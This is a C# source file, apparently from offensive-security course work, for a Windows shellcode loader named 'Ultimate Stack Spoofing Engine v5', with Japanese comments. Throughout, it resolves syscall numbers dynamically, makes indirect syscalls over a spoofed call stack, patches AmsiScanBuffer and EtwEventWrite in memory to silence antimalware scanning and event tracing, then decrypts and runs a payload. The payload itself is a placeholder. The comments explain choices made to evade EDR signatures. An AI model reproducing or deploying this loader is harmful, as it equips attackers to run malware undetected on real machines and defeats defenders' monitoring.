using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace OSEPUltimateEvolution
{
    class Program
    {
        // ========== P/Invoke (ブートストラップ用のみ) ==========
        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("ntdll.dll", EntryPoint = "RtlZeroMemory")]
        static extern void ZeroMemory(IntPtr dest, UIntPtr size);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpLibFileName);

        // ========== デリゲート定義 ==========
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate uint NtAllocateVirtualMemoryDelegate(
            IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits,
            ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate uint NtProtectVirtualMemoryDelegate(
            IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize,
            uint NewProtect, out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate void ShellcodeEntry();

        // ========== 定数 ==========
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;

        // ========== SSN 動的解決 (Hell's Gate + Halo's Gate) ==========
        private static ushort ResolveSsn(IntPtr ntdllBase, string funcName)
        {
            IntPtr funcAddr = GetProcAddress(ntdllBase, funcName);
            if (funcAddr == IntPtr.Zero)
                throw new Exception($"[-] {funcName} not found in ntdll");

            if (IsSyscallStubClean(funcAddr, out ushort ssn))
                return ssn;

            for (int offset = 1; offset <= 500; offset++)
            {
                IntPtr down = (IntPtr)((long)funcAddr + (offset * 0x20));
                if (IsSyscallStubClean(down, out ushort downSsn))
                    return (ushort)(downSsn - offset);

                IntPtr up = (IntPtr)((long)funcAddr - (offset * 0x20));
                if (IsSyscallStubClean(up, out ushort upSsn))
                    return (ushort)(upSsn + offset);
            }

            throw new Exception($"[-] Failed to resolve SSN for {funcName}");
        }

        private static bool IsSyscallStubClean(IntPtr addr, out ushort ssn)
        {
            ssn = 0;
            if (Marshal.ReadByte(addr, 0) == 0x4C &&
                Marshal.ReadByte(addr, 1) == 0x8B &&
                Marshal.ReadByte(addr, 2) == 0xD1 &&
                Marshal.ReadByte(addr, 3) == 0xB8)
            {
                ssn = (ushort)(Marshal.ReadByte(addr, 4) | (Marshal.ReadByte(addr, 5) << 8));
                return true;
            }
            return false;
        }

        // ========== Indirect Syscall ジャンプ先の解決 ==========
        private static IntPtr FindSyscallRet(IntPtr ntdllBase, string funcName)
        {
            IntPtr funcAddr = GetProcAddress(ntdllBase, funcName);

            IntPtr result = ScanForSyscallRet(funcAddr);
            if (result != IntPtr.Zero) return result;

            for (int offset = 1; offset <= 50; offset++)
            {
                IntPtr down = (IntPtr)((long)funcAddr + (offset * 0x20));
                result = ScanForSyscallRet(down);
                if (result != IntPtr.Zero) return result;

                IntPtr up = (IntPtr)((long)funcAddr - (offset * 0x20));
                result = ScanForSyscallRet(up);
                if (result != IntPtr.Zero) return result;
            }

            throw new Exception($"[-] syscall;ret not found for {funcName}");
        }

        private static IntPtr ScanForSyscallRet(IntPtr baseAddr)
        {
            for (int i = 0; i < 0x30; i++)
            {
                if (Marshal.ReadByte(baseAddr, i) == 0x0F &&
                    Marshal.ReadByte(baseAddr, i + 1) == 0x05 &&
                    Marshal.ReadByte(baseAddr, i + 2) == 0xC3)
                {
                    return (IntPtr)((long)baseAddr + i);
                }
            }
            return IntPtr.Zero;
        }

        // ========== スタックスプーフ付き syscall スタブの生成 ==========
        private static byte[] BuildSpoofStub(long fakeStackTop, long syscallRetAddr,
                                              ushort ssn, long returnFixupAddr, int argCount)
        {
            using (var ms = new MemoryStream())
            using (var bw = new BinaryWriter(ms))
            {
                // --- 非揮発性レジスタの保存 ---
                bw.Write(new byte[] { 0x41, 0x54 });                 // push r12
                bw.Write(new byte[] { 0x41, 0x55 });                 // push r13
                bw.Write(new byte[] { 0x41, 0x56 });                 // push r14

                // --- 元スタックから 5th/6th 引数を退避 ---
                // push 3回 = 0x18 バイト。元の [RSP+0x28] → [RSP+0x40]
                if (argCount >= 5)
                    bw.Write(new byte[] { 0x4C, 0x8B, 0x6C, 0x24, 0x40 }); // mov r13, [rsp+0x40]
                if (argCount >= 6)
                    bw.Write(new byte[] { 0x4C, 0x8B, 0x74, 0x24, 0x48 }); // mov r14, [rsp+0x48]

                // --- RSP 待避 ---
                bw.Write(new byte[] { 0x49, 0x89, 0xE4 });          // mov r12, rsp

                // --- RSP を偽装スタックに差し替え ---
                bw.Write(new byte[] { 0x48, 0xBC });                 // mov rsp, imm64
                bw.Write(fakeStackTop);

                // --- リターンアドレスを push ---
                bw.Write(new byte[] { 0x48, 0xB8 });                 // mov rax, imm64
                bw.Write(returnFixupAddr);
                bw.Write((byte)0x50);                                // push rax

                // --- 偽装スタック上に 5th/6th 引数を配置 ---
                if (argCount >= 5)
                    bw.Write(new byte[] { 0x4C, 0x89, 0x6C, 0x24, 0x28 }); // mov [rsp+0x28], r13
                if (argCount >= 6)
                    bw.Write(new byte[] { 0x4C, 0x89, 0x74, 0x24, 0x30 }); // mov [rsp+0x30], r14

                // --- syscall 準備 ---
                bw.Write(new byte[] { 0x4C, 0x8B, 0xD1 });          // mov r10, rcx
                bw.Write((byte)0xB8);                                // mov eax, imm32
                bw.Write((int)ssn);

                // --- jmp syscall;ret ---
                bw.Write(new byte[] { 0x49, 0xBB });                 // mov r11, imm64
                bw.Write(syscallRetAddr);
                bw.Write(new byte[] { 0x41, 0xFF, 0xE3 });          // jmp r11

                // --- fixup ---
                bw.Write(new byte[] { 0x4C, 0x89, 0xE4 });          // mov rsp, r12
                bw.Write(new byte[] { 0x41, 0x5E });                 // pop r14
                bw.Write(new byte[] { 0x41, 0x5D });                 // pop r13
                bw.Write(new byte[] { 0x41, 0x5C });                 // pop r12
                bw.Write((byte)0xC3);                                // ret

                return ms.ToArray();
            }
        }

        private static int FixupSize => 10;

        // ========== 偽装スタックフレームチェーンの構築 ==========
        private static void BuildFakeFrameChain(IntPtr fakeStackBase, int stackSize)
        {
            ZeroMemory(fakeStackBase, (UIntPtr)stackSize);

            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            IntPtr kernel32 = GetModuleHandle("kernel32.dll");

            IntPtr rtlUserThreadStart = GetProcAddress(ntdll, "RtlUserThreadStart");
            IntPtr baseThreadInitThunk = GetProcAddress(kernel32, "BaseThreadInitThunk");

            long rtlRetAddr = FindCallReturnSite(rtlUserThreadStart);
            long btitRetAddr = FindCallReturnSite(baseThreadInitThunk);

            long frame2Rbp = (long)fakeStackBase + stackSize - 0x100;
            Marshal.WriteInt64((IntPtr)frame2Rbp, 0);
            Marshal.WriteInt64((IntPtr)(frame2Rbp + 8), rtlRetAddr);

            long frame1Rbp = frame2Rbp - 0x80;
            Marshal.WriteInt64((IntPtr)frame1Rbp, frame2Rbp);
            Marshal.WriteInt64((IntPtr)(frame1Rbp + 8), btitRetAddr);
        }

        /// <summary>
        /// 関数先頭付近から CALL (E8 xx xx xx xx) の戻りアドレスを取得する。
        ///
        /// 単純な 0xE8 バイトスキャンでは、直前の命令のオペランド中に 0xE8 が
        /// 現れた場合に誤検出する。これを軽減するため、簡易的な命令長デコーダで
        /// x64 の主要なプロローグ命令をステップし、命令境界上の E8 のみを検出する。
        /// 完全なデコーダではないが、ntdll/kernel32 の典型的なプロローグ
        /// (push rbx / sub rsp,xx / mov [rsp+xx],xx / lea / call) には十分対応する。
        /// </summary>
        private static long FindCallReturnSite(IntPtr funcAddr)
        {
            int i = 0;
            while (i < 0x60)
            {
                byte b0 = Marshal.ReadByte(funcAddr, i);

                // E8 rel32 — near CALL (命令境界上)
                if (b0 == 0xE8)
                    return (long)funcAddr + i + 5;

                // 簡易命令長デコーダ (x64 プロローグ主要命令)
                int len = DecodeInstructionLength(funcAddr, i);
                if (len <= 0) { i++; continue; } // 未知の命令は 1 バイト進む
                i += len;
            }
            return (long)funcAddr + 0x04;
        }

        /// <summary>
        /// x64 プロローグでよく出現する命令の長さを返す簡易デコーダ。
        /// 対応外の命令には 0 を返す (呼び出し元が 1 バイト進める)。
        /// </summary>
        private static int DecodeInstructionLength(IntPtr baseAddr, int offset)
        {
            byte b0 = Marshal.ReadByte(baseAddr, offset);
            byte b1 = (offset + 1 < 0x80) ? Marshal.ReadByte(baseAddr, offset + 1) : (byte)0;

            // REX prefix (40-4F)
            bool hasRex = (b0 >= 0x40 && b0 <= 0x4F);
            byte op = hasRex ? b1 : b0;
            int rex = hasRex ? 1 : 0;

            // push r64 (50-57, or REX.B + 50-57)
            if (op >= 0x50 && op <= 0x57) return rex + 1;

            // pop r64 (58-5F, or REX.B + 58-5F)
            if (op >= 0x58 && op <= 0x5F) return rex + 1;

            // ret
            if (op == 0xC3) return rex + 1;

            // nop
            if (op == 0x90) return rex + 1;

            // E8 rel32 — CALL (shouldn't reach here, but be safe)
            if (op == 0xE8) return rex + 5;

            // E9 rel32 — JMP near
            if (op == 0xE9) return rex + 5;

            // EB rel8 — JMP short
            if (op == 0xEB) return rex + 2;

            // ModR/M based instructions — need to decode ModR/M + optional SIB + disp
            // sub rsp, imm8:  48 83 EC xx         (REX.W + 83 /5 ib)
            // mov [rsp+disp8], reg: 48 89 4C 24 xx  (REX.W + 89 ModR/M SIB disp8)
            // lea reg, [rsp+disp8]: 48 8D 6C 24 xx  (REX.W + 8D ModR/M SIB disp8)
            if (op == 0x83)
            {
                // Group 1 Ev,Ib — ModR/M + imm8
                return rex + 1 + ModRmLength(baseAddr, offset + rex + 1) + 1; // +1 for imm8
            }
            if (op == 0x81)
            {
                // Group 1 Ev,Iz — ModR/M + imm32
                return rex + 1 + ModRmLength(baseAddr, offset + rex + 1) + 4;
            }
            if (op == 0x89 || op == 0x8B || op == 0x8D || op == 0x33 || op == 0x3B)
            {
                // mov/lea/xor/cmp r, r/m or r/m, r — ModR/M only
                return rex + 1 + ModRmLength(baseAddr, offset + rex + 1);
            }

            return 0; // unknown
        }

        /// <summary>
        /// ModR/M バイト (+ SIB + displacement) が占めるバイト数を返す。
        /// </summary>
        private static int ModRmLength(IntPtr baseAddr, int offset)
        {
            byte modrm = Marshal.ReadByte(baseAddr, offset);
            int mod = (modrm >> 6) & 3;
            int rm = modrm & 7;

            int len = 1; // ModR/M byte itself
            bool hasSib = (mod != 3) && (rm == 4); // SIB when r/m=100 and mod!=11
            if (hasSib) len++;

            if (mod == 0 && rm == 5) len += 4;       // [RIP+disp32]
            else if (mod == 0 && hasSib)
            {
                byte sib = Marshal.ReadByte(baseAddr, offset + 1);
                if ((sib & 7) == 5) len += 4;        // [disp32 + index*scale]
            }
            else if (mod == 1) len += 1;              // disp8
            else if (mod == 2) len += 4;              // disp32

            return len;
        }

        // ========== AES-256-CBC 復号 ==========
        private static byte[] Decrypt(byte[] cipher, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                return aes.CreateDecryptor().TransformFinalBlock(cipher, 0, cipher.Length);
            }
        }

        // ========== スタブ構築・配置ヘルパー ==========
        private static IntPtr BuildAndDeployStub(long fakeStackTop, long syscallRetAddr,
                                                  ushort ssn, int argCount)
        {
            byte[] template = BuildSpoofStub(fakeStackTop, syscallRetAddr, ssn, 0, argCount);
            int fixupOffset = template.Length - FixupSize;

            IntPtr mem = Marshal.AllocHGlobal(template.Length);
            long returnFixupAddr = (long)mem + fixupOffset;

            byte[] stub = BuildSpoofStub(fakeStackTop, syscallRetAddr, ssn, returnFixupAddr, argCount);
            Marshal.Copy(stub, 0, mem, stub.Length);

            VirtualProtect(mem, (UIntPtr)stub.Length, PAGE_EXECUTE_READ, out _);
            return mem;
        }

        // ========== AMSI / ETW パッチ ==========
        /// <summary>
        /// 指定された関数の先頭バイトを書き換えて無効化する。
        ///
        /// 手順:
        ///   1. NtProtectVirtualMemory (indirect syscall) で対象アドレスを RW に変更
        ///   2. パッチバイトを書き込み
        ///   3. NtProtectVirtualMemory で元のプロテクションに復元
        ///
        /// NtProtectVirtualMemory を使うことで:
        ///   - VirtualProtect の userland hook を回避
        ///   - ETW イベント発火を回避 (ETW 自体のパッチ時に鶏と卵にならない)
        ///
        /// パッチ内容:
        ///   AmsiScanBuffer → mov eax, 0x80070057; ret (B8 57 00 07 80 C3) — E_INVALIDARG を返す
        ///   EtwEventWrite  → ret (0xC3) — 即座に return、イベント送信をスキップ
        /// </summary>
        private static bool PatchFunction(IntPtr targetAddr, byte[] patch,
                                           NtProtectVirtualMemoryDelegate ntProtect)
        {
            if (targetAddr == IntPtr.Zero) return false;

            IntPtr patchAddr = targetAddr;
            IntPtr patchSize = (IntPtr)patch.Length;

            // RW に変更
            uint status = ntProtect(
                (IntPtr)(-1), ref patchAddr, ref patchSize,
                PAGE_READWRITE, out uint oldProtect);

            if (status != 0) return false;

            // パッチ書き込み
            Marshal.Copy(patch, 0, targetAddr, patch.Length);

            // 元のプロテクションに復元
            patchAddr = targetAddr;
            patchSize = (IntPtr)patch.Length;
            ntProtect((IntPtr)(-1), ref patchAddr, ref patchSize, oldProtect, out _);

            return true;
        }

        /// <summary>
        /// AMSI (Antimalware Scan Interface) を無効化する。
        ///
        /// AmsiScanBuffer は .NET CLR が Assembly.Load / スクリプト実行時に呼び出す。
        /// 先頭を "mov eax, 0x80070057; ret" に書き換えることで E_INVALIDARG を返し、
        /// 呼び出し元がスキャン結果を AMSI_RESULT_CLEAN として処理する。
        ///
        /// amsi.dll は .NET CLR 初期化時に自動ロードされるが、
        /// プロセス起動直後はまだロードされていない場合がある。
        /// GetModuleHandle で取得できない場合は LoadLibrary で明示的にロードし、
        /// パッチ後に以降の CLR スキャンを全て無効化する。
        /// </summary>
        private static bool PatchAmsi(NtProtectVirtualMemoryDelegate ntProtect)
        {
            IntPtr amsi = GetModuleHandle("amsi.dll");
            if (amsi == IntPtr.Zero)
            {
                // CLR がまだ amsi.dll をロードしていない場合、先にロードしてパッチ
                amsi = LoadLibrary("amsi.dll");
                if (amsi == IntPtr.Zero) return true; // amsi.dll が存在しない環境 (Server Core 等)
            }

            IntPtr amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
            if (amsiScanBuffer == IntPtr.Zero) return false;

            // mov eax, 0x80070057 (E_INVALIDARG) → AMSI は戻り値 HRESULT を検査し、
            // 失敗時はスキャン結果を AMSI_RESULT_CLEAN として扱う。
            // xor eax,eax (S_OK) でも動作するが、一部 EDR は S_OK + CLEAN の組合せを
            // シグネチャ検出するため、E_INVALIDARG のほうが検出回避に優れる。
            // ret (C3)
            byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            return PatchFunction(amsiScanBuffer, patch, ntProtect);
        }

        /// <summary>
        /// Userland ETW (Event Tracing for Windows) を無効化する。
        ///
        /// ntdll!EtwEventWrite は userland ETW プロバイダのイベント送信関数。
        /// ここをパッチすることで:
        ///   - Microsoft-Windows-DotNET-Runtime (.NET アセンブリロード検出)
        ///   等の userland ETW イベントが沈黙する。
        ///
        /// 注意: Microsoft-Windows-Threat-Intelligence (ETW-TI) はカーネルドライバ
        /// (WdFilter.sys 等) から直接発火するため、このパッチの影響を受けない。
        /// ETW-TI は引き続き NtAllocateVirtualMemory / NtProtectVirtualMemory の
        /// 呼び出しを記録する。
        ///
        /// "ret" (0xC3) 1 バイトで関数を即座に返す。
        /// 戻り値は不定だが、ETW のエラーハンドリングは寛容なため動作に影響しない。
        /// </summary>
        private static bool PatchEtw(NtProtectVirtualMemoryDelegate ntProtect)
        {
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
            if (etwEventWrite == IntPtr.Zero) return false;

            byte[] patch = new byte[] { 0xC3 }; // ret
            return PatchFunction(etwEventWrite, patch, ntProtect);
        }

        // ========== エントリポイント ==========
        static void Main(string[] args)
        {
            Console.WriteLine("[*] Ultimate Stack Spoofing Engine v5");

            IntPtr ntdll = GetModuleHandle("ntdll.dll");

            // --- Step 1: SSN の動的解決 ---
            ushort ssnAllocate = ResolveSsn(ntdll, "NtAllocateVirtualMemory");
            ushort ssnProtect = ResolveSsn(ntdll, "NtProtectVirtualMemory");
            Console.WriteLine($"[+] NtAllocateVirtualMemory SSN: 0x{ssnAllocate:X4}");
            Console.WriteLine($"[+] NtProtectVirtualMemory  SSN: 0x{ssnProtect:X4}");

            // --- Step 2: Indirect Syscall ジャンプ先の解決 ---
            IntPtr syscallRetAllocate = FindSyscallRet(ntdll, "NtAllocateVirtualMemory");
            IntPtr syscallRetProtect = FindSyscallRet(ntdll, "NtProtectVirtualMemory");

            // --- Step 3: 偽装スタック構築 ---
            int fakeStackSize = 0x4000;
            IntPtr fakeStackBase = Marshal.AllocHGlobal(fakeStackSize);
            BuildFakeFrameChain(fakeStackBase, fakeStackSize);
            long fakeStackTop = ((long)fakeStackBase + fakeStackSize - 0x100 - 0x80 - 0x40) & ~0xFL;

            // --- Step 4: NtProtectVirtualMemory スタブを先に構築 ---
            // AMSI/ETW パッチで NtProtectVirtualMemory が必要なため、先に用意する
            IntPtr protectStubMem = BuildAndDeployStub(fakeStackTop, (long)syscallRetProtect, ssnProtect, 5);
            var ntProtect = (NtProtectVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(
                protectStubMem, typeof(NtProtectVirtualMemoryDelegate));

            // --- Step 5: ETW パッチ (AMSI より先に実行) ---
            // ETW を先に沈黙させることで、AMSI パッチ時の LoadLibrary イベントも記録されない
            if (PatchEtw(ntProtect))
                Console.WriteLine("[+] ETW patched (EtwEventWrite neutralized)");
            else
                Console.WriteLine("[!] ETW patch failed — CLR events may be logged");

            // --- Step 6: AMSI パッチ ---
            if (PatchAmsi(ntProtect))
                Console.WriteLine("[+] AMSI patched (AmsiScanBuffer neutralized)");
            else
                Console.WriteLine("[!] AMSI patch failed — in-memory scan active");

            // --- Step 7: NtAllocateVirtualMemory スタブの構築 ---
            IntPtr allocStubMem = BuildAndDeployStub(fakeStackTop, (long)syscallRetAllocate, ssnAllocate, 6);
            var ntAllocate = (NtAllocateVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(
                allocStubMem, typeof(NtAllocateVirtualMemoryDelegate));

            // --- Step 8: ペイロード復号 ---
            // TODO: 実運用では鍵をリモートフェッチまたは PBKDF2 導出に変更
            byte[] encryptedPayload = new byte[] { 0x11, 0x22, 0x33, 0x44 }; // プレースホルダ
            byte[] key = Encoding.UTF8.GetBytes("A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1");
            byte[] iv = Encoding.UTF8.GetBytes("1A2B3C4D5E6F7A8B");
            byte[] shellcode = Decrypt(encryptedPayload, key, iv);

            // --- Step 9: RW メモリ確保 ---
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            Console.WriteLine("[*] NtAllocateVirtualMemory via spoofed stack...");
            uint status = ntAllocate(
                (IntPtr)(-1), ref baseAddress, IntPtr.Zero, ref regionSize,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            if (status != 0)
            {
                Console.WriteLine($"[-] NtAllocateVirtualMemory failed: NTSTATUS 0x{status:X8}");
                return;
            }
            Console.WriteLine($"[+] Allocated RW region at 0x{baseAddress.ToInt64():X16}");

            // --- Step 10: Shellcode コピー ---
            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            // --- Step 11: RW → RX ---
            Console.WriteLine("[*] NtProtectVirtualMemory via spoofed stack (RW -> RX)...");
            IntPtr protectBase = baseAddress;
            IntPtr protectSize = regionSize;
            status = ntProtect(
                (IntPtr)(-1), ref protectBase, ref protectSize,
                PAGE_EXECUTE_READ, out uint oldProt);

            if (status != 0)
            {
                Console.WriteLine($"[-] NtProtectVirtualMemory failed: NTSTATUS 0x{status:X8}");
                return;
            }
            Console.WriteLine("[+] Memory protection changed to RX");

            // --- Step 12: Shellcode 実行 ---
            Console.WriteLine("[*] Executing payload...");
            var exec = (ShellcodeEntry)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(ShellcodeEntry));
            exec();

            // --- クリーンアップ ---
            Marshal.FreeHGlobal(fakeStackBase);
            Marshal.FreeHGlobal(allocStubMem);
            Marshal.FreeHGlobal(protectStubMem);
        }
    }
}
